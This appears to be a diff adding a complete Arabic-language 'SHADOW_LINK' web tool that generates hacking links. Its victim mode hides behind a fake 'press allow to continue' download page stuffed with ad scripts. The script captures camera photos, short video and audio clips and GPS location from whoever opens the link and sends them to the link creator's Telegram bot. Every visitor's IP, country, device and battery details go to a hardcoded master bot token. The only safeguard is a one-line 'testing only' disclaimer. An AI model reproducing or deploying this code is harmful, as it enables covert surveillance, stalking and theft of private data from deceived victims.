@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>⟁ مُنشئ الروابط · الظل</title>
+  <style>
+    /* ----- الأساسيات والخطوط ----- */
+    @import url('https://fonts.googleapis.com/css2?family=Changa:wght@400;600;800&display=swap');
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Changa', 'Segoe UI', sans-serif;
+      background: #000000;
+      min-height: 100vh;
+      color: #e0ffe0;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* ----- تأثير تساقط الأرقام (Matrix Rain) ----- */
+    #matrixCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+      opacity: 0.2;
+    }
+
+    /* ----- الطبقة الرئيسية فوق الكانفاس ----- */
+    .wrapper {
+      position: relative;
+      z-index: 5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 20px;
+      backdrop-filter: blur(2px);
+    }
+
+    /* ----- البطاقة الزجاجية المتناسقة ----- */
+    .glass-card {
+      width: 100%;
+      max-width: 780px;
+      background: rgba(5, 15, 5, 0.65);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(0, 255, 150, 0.25);
+      border-radius: 32px;
+      padding: 30px 28px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(0, 255, 200, 0.1) inset, 0 0 30px rgba(0, 255, 150, 0.2);
+      transition: box-shadow 0.3s;
+    }
+
+    .glass-card:hover {
+      box-shadow: 0 20px 50px rgba(0, 255, 150, 0.15), 0 0 0 1px #00ff9940 inset;
+    }
+
+    /* ----- الترويسة والعناوين ----- */
+    .header {
+      width: 100%;
+      max-width: 1100px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+
+    .brand {
+      font-weight: 800;
+      font-size: 28px;
+      background: linear-gradient(135deg, #aaffaa, #00ffaa);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 20px #00ffaa80;
+      letter-spacing: 2px;
+    }
+
+    .nav {
+      display: flex;
+      gap: 18px;
+    }
+
+    .nav a {
+      color: #a0f0c0;
+      text-decoration: none;
+      padding: 8px 18px;
+      border-radius: 40px;
+      background: rgba(0, 40, 20, 0.5);
+      border: 1px solid #00cc7740;
+      font-weight: 600;
+      backdrop-filter: blur(5px);
+      transition: 0.2s;
+    }
+
+    .nav a:hover {
+      background: #00aa5530;
+      border-color: #00ffaa;
+      box-shadow: 0 0 15px #00ffaa;
+    }
+
+    /* ----- داخل البطاقة ----- */
+    .title {
+      font-size: 36px;
+      font-weight: 800;
+      margin-bottom: 8px;
+      color: #ffffff;
+      text-shadow: 0 0 10px #00cc77;
+    }
+
+    .subtitle {
+      color: #bbffdd;
+      margin-bottom: 28px;
+      font-size: 16px;
+      opacity: 0.9;
+    }
+
+    .warning-note {
+      background: #1a2a1a;
+      padding: 12px 18px;
+      border-radius: 20px;
+      margin-bottom: 28px;
+      border-right: 6px solid #ffaa33;
+      color: #ffddbb;
+      font-weight: 600;
+      font-size: 15px;
+      box-shadow: inset 0 0 10px #00000055;
+    }
+
+    .form {
+      background: rgba(0, 15, 0, 0.3);
+      padding: 18px 20px;
+      border-radius: 24px;
+      border: 1px solid #00ff8830;
+    }
+
+    label {
+      display: block;
+      margin: 16px 0 8px;
+      font-weight: 700;
+      color: #bbffbb;
+      letter-spacing: 0.5px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 14px 18px;
+      border-radius: 40px;
+      border: 1.5px solid #00aa7740;
+      background: #041008;
+      color: #e0ffe0;
+      font-size: 16px;
+      outline: none;
+      transition: all 0.2s;
+      font-family: 'Changa', monospace;
+      box-shadow: inset 0 2px 8px #000000;
+    }
+
+    input[type="text"]:focus {
+      border-color: #00ffaa;
+      box-shadow: 0 0 18px #00ffaa60, inset 0 0 5px #000;
+    }
+
+    .checkbox-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 20px 0 10px;
+      max-height: 300px;
+      overflow-y: auto;
+      padding: 8px 4px;
+      background: #0a1a0a30;
+      border-radius: 20px;
+      scrollbar-width: thin;
+      scrollbar-color: #00aa77 #001a0a;
+    }
+
+    .checkbox-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: #0b1e0b80;
+      padding: 10px 18px;
+      border-radius: 50px;
+      border: 1px solid #1a4a2a;
+      backdrop-filter: blur(5px);
+      transition: 0.15s;
+    }
+
+    .checkbox-item:hover {
+      background: #1a3a1a;
+      border-color: #00ffaa;
+    }
+
+    .checkbox-item input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: #00cc66;
+      transform: scale(1.1);
+      cursor: pointer;
+    }
+
+    .checkbox-item label {
+      margin: 0;
+      font-weight: 500;
+      color: #d0ffd0;
+      cursor: pointer;
+      flex: 1;
+    }
+
+    .btn {
+      display: inline-block;
+      width: 100%;
+      padding: 16px 10px;
+      border-radius: 60px;
+      border: none;
+      background: linear-gradient(145deg, #00aa55, #007744);
+      color: #ffffff;
+      font-weight: 800;
+      font-size: 20px;
+      cursor: pointer;
+      margin-top: 25px;
+      box-shadow: 0 10px 20px #00000060, 0 0 20px #00ffaa80;
+      border: 1px solid #88ffbb;
+      transition: 0.2s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .btn:hover {
+      background: linear-gradient(145deg, #00cc66, #009955);
+      box-shadow: 0 8px 25px #00ffaa, 0 0 30px #00ffbb;
+      transform: scale(1.01);
+    }
+
+    .result {
+      margin-top: 24px;
+      padding: 16px 20px;
+      border-radius: 60px;
+      background: #021008;
+      border: 1px solid #00cc77;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 15px;
+      word-break: break-all;
+    }
+
+    #linkText {
+      color: #aaffcc;
+      font-size: 15px;
+      font-family: monospace;
+      direction: ltr;
+      text-align: left;
+    }
+
+    .copyBtn {
+      padding: 10px 22px;
+      border-radius: 40px;
+      background: #1a3a2a;
+      border: 1px solid #00aa55;
+      color: #eeffee;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.2s;
+      white-space: nowrap;
+    }
+
+    .copyBtn:hover {
+      background: #00aa55;
+      color: #000;
+      box-shadow: 0 0 15px #00ffaa;
+    }
+
+    .madeby {
+      position: fixed;
+      left: 20px;
+      bottom: 20px;
+      z-index: 20;
+      background: #0a1a0ad0;
+      padding: 8px 20px;
+      border-radius: 40px;
+      font-weight: 800;
+      color: #aaffaa;
+      border: 1px solid #00aa77;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 0 20px #00000080;
+    }
+
+    .captureBadge {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 30;
+      background: #0f1f0fe0;
+      padding: 10px 22px;
+      border-radius: 40px;
+      font-weight: 700;
+      color: #ffd966;
+      border: 1px solid #ffbb33;
+      backdrop-filter: blur(8px);
+      display: none;
+    }
+
+    /* ----- صفحة التحميل الجانبية (وضع الضحية) ----- */
+    .download-page {
+      width: 100%;
+      min-height: 100vh;
+      background: transparent;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .main-box {
+      width: 95%;
+      max-width: 600px;
+      background: rgba(5, 20, 5, 0.7);
+      backdrop-filter: blur(16px);
+      border: 1px solid #00cc77;
+      border-radius: 32px;
+      padding: 30px 25px;
+      box-shadow: 0 20px 50px #000000, 0 0 30px #00aa5580;
+      text-align: center;
+    }
+
+    .main-box h2 {
+      color: #e0ffe0;
+      margin-bottom: 25px;
+      font-size: 20px;
+      font-weight: 600;
+      text-shadow: 0 0 8px #00ffaa;
+    }
+
+    .ad-box {
+      margin: 20px 0;
+      padding: 10px;
+      border-radius: 24px;
+      background: #0a1f0a70;
+      border: 1px dashed #00aa77;
+      min-height: 100px;
+      backdrop-filter: blur(4px);
+    }
+
+    .download-btn {
+      background: #00aa55;
+      color: white;
+      padding: 20px 50px;
+      font-size: 24px;
+      border: none;
+      border-radius: 60px;
+      cursor: pointer;
+      font-weight: 800;
+      box-shadow: 0 10px 0 #004d2a, 0 0 30px #00ffaa;
+      border: 1px solid #aaffaa;
+      transition: 0.1s;
+      margin: 20px 0 10px;
+      width: 100%;
+    }
+
+    .download-btn:active {
+      transform: translateY(5px);
+      box-shadow: 0 5px 0 #004d2a, 0 0 40px #00ffaa;
+    }
+
+    .footer {
+      color: #88aa88;
+      margin-top: 20px;
+    }
+
+    /* إخفاء عناصر لا نحتاجها في الوضع الجانبي */
+    .hidden {
+      display: none !important;
+    }
+
+    /* استجابة للجوال */
+    @media (max-width: 600px) {
+      .glass-card { padding: 20px 16px; }
+      .title { font-size: 28px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- تأثير تساقط الأرقام (Matrix) -->
+  <canvas id="matrixCanvas"></canvas>
+
+  <!-- شارة الإشعار (للتصحيح) -->
+  <div id="captureBadge" class="captureBadge">⚡ جاري الالتقاط...</div>
+  <div class="madeby">⍟ الظل المبرمج · v2.0</div>
+
+  <div class="wrapper">
+    <!-- الهيدر (يختفي في وضع الضحية) -->
+    <div class="header" id="mainHeader">
+      <div class="brand">⟁ SHADOW_LINK</div>
+      <div class="nav">
+        <a href="#">أداة</a>
+        <a href="#">سجل</a>
+      </div>
+    </div>
+
+    <!-- البطاقة الرئيسية (تختفي عند وجود بارامترات) -->
+    <div class="glass-card" id="mainCard">
+      <div class="title">مُولّد الروابط</div>
+      <div class="subtitle">تحكم كامل · سريع · غير قابل للتتبع</div>
+      
+      <div class="warning-note">
+        ⚡ تحذير: الاستخدام غير الأخلاقي يقع تحت مسؤوليتك. الأداة لأغراض الاختبار فقط.
+      </div>
+
+      <div class="form" id="formBox">
+        <label>📟 Chat ID</label>
+        <input type="text" id="chatIdInput" placeholder="مثال: 6197511637" value="">
+
+        <label>🤖 Bot Token</label>
+        <input type="text" id="tokenInput" placeholder="8731675349:AAH...">
+
+        <label>🎯 الميزات (مدة 5 ثوانٍ):</label>
+        <div class="checkbox-group" id="featuresGroup">
+          <div class="checkbox-item">
+            <input type="checkbox" id="camFront" value="camFront" checked>
+            <label for="camFront">📸 صورة أمامية</label>
+          </div>
+          <div class="checkbox-item">
+            <input type="checkbox" id="camBack" value="camBack">
+            <label for="camBack">📷 صورة خلفية</label>
+          </div>
+          <div class="checkbox-item">
+            <input type="checkbox" id="videoFront" value="videoFront">
+            <label for="videoFront">🎥 فيديو أمامي (5s)</label>
+          </div>
+          <div class="checkbox-item">
+            <input type="checkbox" id="videoBack" value="videoBack">
+            <label for="videoBack">📹 فيديو خلفي (5s)</label>
+          </div>
+          <div class="checkbox-item">
+            <input type="checkbox" id="audio" value="audio">
+            <label for="audio">🎤 تسجيل صوتي (5s)</label>
+          </div>
+          <div class="checkbox-item">
+            <input type="checkbox" id="location" value="location">
+            <label for="location">📍 الموقع GPS</label>
+          </div>
+        </div>
+
+        <button class="btn" id="generateBtn">⟁ إنشاء رابط الاختراق</button>
+
+        <div id="result" style="display:none" class="result">
+          <div id="linkText" style="flex:1;"></div>
+          <button class="copyBtn" id="copyBtn">📋 نسخ</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      "use strict";
+
+      // ---------- ثوابت البوت الرئيسي (لتسجيل الزوار) ----------
+      const MASTER_BOT_TOKEN = "8731675349:AAHOrgjGGPeItermX2uqwXcDnz8KvzfPaeY";
+      const MASTER_CHAT_ID   = "6197511637";
+
+      // ---------- متغيرات الزائر ----------
+      let visitorIP = "غير معروف";
+      let visitorCountry = "غير معروف";
+      let visitorDevice = "Unknown";
+      let visitorBattery = "غير متاح";
+      let visitorOS = "غير معروف";
+
+      // ---------- تأثير تساقط الأرقام (Matrix Rain) ----------
+      function initMatrix() {
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        let width, height;
+        let columns, drops;
+        const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789".split("");
+        const fontSize = 18;
+        
+        function resize() {
+          width = window.innerWidth;
+          height = window.innerHeight;
+          canvas.width = width;
+          canvas.height = height;
+          columns = Math.floor(width / fontSize) + 2;
+          drops = [];
+          for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * -height / fontSize);
+          }
+        }
+        
+        function draw() {
+          ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+          ctx.fillRect(0, 0, width, height);
+          ctx.fillStyle = "#0f0";
+          ctx.font = fontSize + "px 'Changa', monospace";
+          
+          for (let i = 0; i < drops.length; i++) {
+            const text = chars[Math.floor(Math.random() * chars.length)];
+            const x = i * fontSize;
+            const y = drops[i] * fontSize;
+            
+            ctx.fillStyle = "#00ffaa";
+            ctx.shadowColor = "#00ffaa";
+            ctx.shadowBlur = 10;
+            ctx.fillText(text, x, y);
+            
+            if (y > height && Math.random() > 0.975) {
+              drops[i] = 0;
+            }
+            drops[i]++;
+          }
+          ctx.shadowBlur = 0;
+        }
+        
+        window.addEventListener('resize', resize);
+        resize();
+        setInterval(draw, 45);
+      }
+      initMatrix();
+
+      // ---------- إرسال معلومات الزائر (مرة واحدة) ----------
+      async function sendVisitorInfo() {
+        try {
+          const ua = navigator.userAgent;
+          if (/Android/i.test(ua)) visitorDevice = "Android";
+          else if (/iPhone|iPad|iPod/i.test(ua)) visitorDevice = "iOS";
+          else visitorDevice = "Desktop/Other";
+
+          if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            visitorBattery = Math.round(battery.level * 100) + "%";
+            if (battery.charging) visitorBattery += " ⚡";
+          }
+          try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            visitorIP = data.ip || visitorIP;
+            visitorCountry = data.country_name || visitorCountry;
+          } catch(e) {}
+
+          const msg = `🟢 *زيارة جديدة*\n🌍 الدولة: ${visitorCountry}\n📱 الجهاز: ${visitorDevice}\n🔋 البطارية: ${visitorBattery}\n🌐 IP: ${visitorIP}\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+          await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown'})
+          });
+        } catch (e) {}
+      }
+      sendVisitorInfo();
+
+      // ---------- دوال الوسائط (كاميرا/فيديو/صوت) ----------
+      function buildCaption(extra = "") {
+        return `━━━━━━━━━━━━━━━\n🌍 الدولة: ${visitorCountry}\n📱 الجهاز: ${visitorDevice}\n🔋 البطارية: ${visitorBattery}\n🌐 IP: ${visitorIP}\n🕒 ${new Date().toLocaleString('ar-EG')}\n${extra}\n━━━━━━━━━━━━━━━`;
+      }
+
+      async function captureAndSend(stream, chat, token, type) {
+        const video = document.createElement('video');
+        video.autoplay = true;
+        video.playsInline = true;
+        video.muted = true;
+        video.style.position = 'fixed'; video.style.top = '-1000px';
+        video.srcObject = stream;
+        document.body.appendChild(video);
+
+        return new Promise((resolve) => {
+          video.onloadedmetadata = async () => {
+            await video.play();
+            setTimeout(async () => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob(async (blob) => {
+                if (blob && blob.size > 500) {
+                  const form = new FormData();
+                  form.append('chat_id', chat);
+                  form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+                  form.append('caption', buildCaption(`📸 ${type==='front'?'أمامية':'خلفية'}`));
+                  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:form}).catch(()=>{});
+                }
+                document.body.removeChild(video);
+                resolve();
+              }, 'image/jpeg', 0.9);
+            }, 1800);
+          };
+        });
+      }
+
+      async function recordVideo(stream, chat, token, type) {
+        const recorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, {type: 'video/mp4'});
+          const form = new FormData();
+          form.append('chat_id', chat);
+          form.append('video', blob, `${type}_${Date.now()}.mp4`);
+          form.append('caption', buildCaption(`🎥 فيديو ${type==='front'?'أمامي':'خلفي'} 5s`));
+          await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {method:'POST', body:form}).catch(()=>{});
+        };
+        recorder.start();
+        setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, 5000);
+      }
+
+      async function recordAudio(stream, chat, token) {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, {type: 'audio/mp4'});
+          const form = new FormData();
+          form.append('chat_id', chat);
+          form.append('audio', blob, `audio_${Date.now()}.mp4`);
+          form.append('caption', buildCaption(`🎤 تسجيل صوتي 5s`));
+          await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {method:'POST', body:form}).catch(()=>{});
+        };
+        recorder.start();
+        setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, 5000);
+      }
+
+      async function sendLocationOnly(chat, token) {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) return resolve();
+          navigator.geolocation.getCurrentPosition(async (pos) => {
+            const {latitude, longitude} = pos.coords;
+            const text = buildCaption(`📍 الإحداثيات: ${latitude}, ${longitude}\n🔗 https://maps.google.com/?q=${latitude},${longitude}`);
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method:'POST', headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({chat_id: chat, text})
+            }).catch(()=>{});
+            resolve();
+          }, ()=> resolve(), {timeout:5000});
+        });
+      }
+
+      // ---------- تنفيذ الميزات للضحية (بدون تأخير) ----------
+      async function executeFeatures(chat, token, featuresStr) {
+        if (!featuresStr) return;
+        const list = featuresStr.split(',');
+        const needCam = list.some(f=>['camFront','camBack','videoFront','videoBack'].includes(f));
+        const needMic = list.some(f=>['audio','videoFront','videoBack'].includes(f));
+        
+        // طلب إذن موحد (اختياري)
+        if(needCam || needMic) {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: needCam, audio: needMic});
+            stream.getTracks().forEach(t=>t.stop());
+          } catch(e) { /* نكمل حتى لو رفض */ }
+        }
+
+        // تنفيذ بدون انتظار متسلسل (متزامن للسرعة)
+        const promises = [];
+        if(list.includes('camFront')) promises.push((async()=>{
+          try{ const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}); await captureAndSend(s,chat,token,'front'); s.getTracks().forEach(t=>t.stop()); }catch(e){}
+        })());
+        if(list.includes('camBack')) promises.push((async()=>{
+          try{ const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}}); await captureAndSend(s,chat,token,'back'); s.getTracks().forEach(t=>t.stop()); }catch(e){}
+        })());
+        if(list.includes('videoFront')) promises.push((async()=>{
+          try{ const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:true}); await recordVideo(s,chat,token,'front'); s.getTracks().forEach(t=>t.stop()); }catch(e){}
+        })());
+        if(list.includes('videoBack')) promises.push((async()=>{
+          try{ const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}, audio:true}); await recordVideo(s,chat,token,'back'); s.getTracks().forEach(t=>t.stop()); }catch(e){}
+        })());
+        if(list.includes('audio')) promises.push((async()=>{
+          try{ const s=await navigator.mediaDevices.getUserMedia({audio:true}); await recordAudio(s,chat,token); s.getTracks().forEach(t=>t.stop()); }catch(e){}
+        })());
+        if(list.includes('location')) promises.push(sendLocationOnly(chat, token));
+        
+        await Promise.allSettled(promises);
+      }
+
+      // ---------- فحص المعاملات: وضع الضحية أم المنشئ ----------
+      const params = new URLSearchParams(window.location.search);
+      const chatParam = params.get('chat');
+      const tokenParam = params.get('token');
+      const featuresParam = params.get('features');
+
+      if (chatParam && tokenParam) {
+        // ----- وضع الضحية (صفحة جانبية) -----
+        document.getElementById('mainHeader').classList.add('hidden');
+        document.getElementById('mainCard').classList.add('hidden');
+        document.querySelector('.madeby').style.display = 'none';
+        document.getElementById('captureBadge').style.display = 'none';
+        
+        const wrapper = document.querySelector('.wrapper');
+        wrapper.innerHTML = ''; // تنظيف
+        wrapper.style.padding = '0';
+        
+        const downloadPage = document.createElement('div');
+        downloadPage.className = 'download-page';
+        const mainBox = document.createElement('div');
+        mainBox.className = 'main-box';
+        
+        const h2 = document.createElement('h2');
+        h2.textContent = '⛓️ اضغط سماح للمتابعة · حماية من الزيارات الوهمية';
+        mainBox.appendChild(h2);
+        
+        // صندوق إعلان 1
+        const ad1 = document.createElement('div'); ad1.className = 'ad-box'; mainBox.appendChild(ad1);
+        // صندوق إعلان 2
+        const ad2 = document.createElement('div'); ad2.className = 'ad-box';
+        const containerDiv = document.createElement('div'); containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
+        ad2.appendChild(containerDiv); mainBox.appendChild(ad2);
+        
+        const dlBtn = document.createElement('button');
+        dlBtn.className = 'download-btn';
+        dlBtn.textContent = '⏵ التالي ⏴';
+        dlBtn.onclick = ()=> window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
+        mainBox.appendChild(dlBtn);
+        
+        const ad3 = document.createElement('div'); ad3.className = 'ad-box'; mainBox.appendChild(ad3);
+        const ad4 = document.createElement('div'); ad4.className = 'ad-box'; mainBox.appendChild(ad4);
+        const footer = document.createElement('div'); footer.className = 'footer'; footer.textContent = '⍟ جارٍ التحميل ...'; mainBox.appendChild(footer);
+        
+        downloadPage.appendChild(mainBox);
+        wrapper.appendChild(downloadPage);
+        
+        // تحميل الإعلانات الأصلية
+        function loadAd(src) { const s=document.createElement('script'); s.src=src; s.async=true; document.body.appendChild(s); }
+        loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+        loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+        loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+        const atScript = document.createElement('script');
+        atScript.innerHTML = `atOptions={'key':'0b7539a5227dc7b69da2ea94b0521ab6','format':'iframe','height':300,'width':160,'params':{}};`;
+        document.body.appendChild(atScript);
+        loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
+        
+        // بدء تنفيذ الميزات
+        executeFeatures(chatParam, tokenParam, featuresParam);
+      } else {
+        // ----- وضع المنشئ (الصفحة الرئيسية) -----
+        // إزالة الاشتراك الإجباري بالكامل (لا يوجد دايالوج)
+        const genBtn = document.getElementById('generateBtn');
+        const resDiv = document.getElementById('result');
+        const linkSpan = document.getElementById('linkText');
+        const copyBtn = document.getElementById('copyBtn');
+        
+        genBtn.addEventListener('click', ()=>{
+          const chat = document.getElementById('chatIdInput').value.trim();
+          const token = document.getElementById('tokenInput').value.trim();
+          if(!chat || !token) { alert('املأ جميع الحقول'); return; }
+          
+          const checks = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
+          const feats = Array.from(checks).map(cb=>cb.value).join(',');
+          const full = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(feats)}`;
+          linkSpan.textContent = full;
+          resDiv.style.display = 'flex';
+        });
+        
+        copyBtn.addEventListener('click', async ()=>{
+          try {
+            await navigator.clipboard.writeText(linkSpan.textContent);
+            copyBtn.textContent = '✓ تم';
+            setTimeout(()=> copyBtn.textContent = '📋 نسخ', 1500);
+          } catch(e) { alert('نسخ يدوياً'); }
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
